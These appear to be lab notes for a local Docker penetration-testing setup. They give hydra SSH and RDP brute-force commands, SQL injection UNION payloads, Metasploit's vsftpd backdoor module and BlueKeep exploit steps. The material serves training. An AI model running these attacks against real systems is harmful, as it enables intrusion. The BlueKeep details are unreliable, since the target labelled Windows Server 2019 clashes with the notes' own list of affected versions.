
1. colima start / status to check 
2. export DOCKER_HOST=unix://$HOME/.colima/default/docker.sock
3. being on kaziislam@mac bootcon-project % ansible-playbook ssh-brute-lab/ansible/lab/lab-setup.yml 

`docker network inspect pentest-net` - will show IPs for each container

`docker ps -q | xargs -n1 docker inspect --format '{{ .Name }} - {{range .NetworkSettings.Networks}}{{.IPAddress}}{{end}}'` - will show IP address of each container



2. ansible-playbook setup-network.yml
3. ansible-playbook ping-docker.yml
4. ansible-playbook setup-target.yml 
4. ansible-playbook setup-kali.yml
5. ansible-playbook setup-metasploit.yml

6. ```docker ps                            
CONTAINER ID   IMAGE                      COMMAND       CREATED              STATUS              PORTS                                        NAMES
0dbae64894e7   tleemcjr/metasploitable2   "/bin/bash"   About a minute ago   Up About a minute   0.0.0.0:2223->22/tcp, 0.0.0.0:8180->80/tcp   metasploit_target
cf6c599b0a86   kalilinux/kali-rolling     "/bin/bash"   5 minutes ago        Up 5 minutes                                                     kali_attacker
5c0da4cb5631   ubuntu                     "/bin/bash"   10 minutes ago       Up 10 minutes       0.0.0.0:2222->22/tcp                         target_ssh```

7. docker exec -it kali_attacker /bin/bash

8. python3 /opt/lab/ssh-bruteforce.py OR hydra -l root -P /usr/share/wordlists/rockyou.txt ssh://172.18.0.3:22

python3 /opt/lab/rdp-bruteforce.py OR hydra -l root -P /usr/share/wordlists/rockyou.txt ssh://172.18.0.4:22


`http://localhost:8080/sqli_1.php`
`ORDER BY 8 #` - go from 1 till see no error
`a' UNION SELECT 1,2,3,4,5,6,7 #`
`a' UNION SELECT 1, @@version, 3,4,5,6,7 #`
`a' UNION SELECT 1, user(), 3,4,5,6,7 #`


9. msfconsole

10. ```use exploit/unix/ftp/vsftpd_234_backdoor
set RHOST host.docker.internal
set RPORT 21
run```

```
# Check XRDP logs
docker exec rdp_target tail -f /var/log/xrdp.log

# Restart XRDP service
docker exec rdp_target service xrdp restart

# Verify network connectivity
docker exec rdp_target netstat -tulpn | grep 3389
```


to exploit windows server

# Windows RDP Target Setup
1. ansible-playbook setup-windows.yml
2. docker exec -it kali_attacker python3 /opt/lab/rdp_scan.py
3. msfconsole
4. use auxiliary/scanner/rdp/cve_2019_0708_bluekeep
5. set RHOSTS windows_target
6. run

# Windows RDP Attack Steps

## Method 1: BlueKeep Exploitation
```bash
msfconsole
use exploit/windows/rdp/cve_2019_0708_bluekeep
set RHOSTS windows_target
set LHOST kali_attacker
set TARGET 2  # Windows Server 2019
exploit
```

## Method 2: RDP Password Spray (Optional)
```bash
# Only if you want to try password brute-force
hydra -l Administrator -P /usr/share/wordlists/rockyou.txt rdp://windows_target
```

Note: BlueKeep (CVE-2019-0708) is a wormable RDP vulnerability that doesn't require credentials. It affects Windows systems that:
- Have RDP enabled
- Haven't been patched (pre-May 2019)
- Are running Windows 7, Windows Server 2008, or Windows Server 2008 R2